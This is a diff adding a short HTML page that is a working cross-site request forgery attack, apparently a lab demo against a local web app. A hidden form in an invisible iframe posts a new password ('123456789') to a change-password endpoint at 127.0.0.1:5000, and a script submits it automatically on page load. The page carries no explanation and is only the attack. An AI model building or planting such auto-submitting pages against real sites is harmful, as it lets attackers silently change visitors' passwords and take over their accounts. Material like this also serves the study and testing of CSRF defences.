@@ -1,0 +1,13 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <iframe style="display:none" name="csrf-frame"></iframe>
+    <form action='http://127.0.0.1:5000/change-pwd' method='POST' target="csrf-frame" id="attack">
+        <input type="hidden" name="password" value="123456789"/>
+        <input type="hidden" name="re_password" value="123456789"/>
+    </form>
+    <script>document.getElementById("attack").submit()</script>
+</body>
+</html>
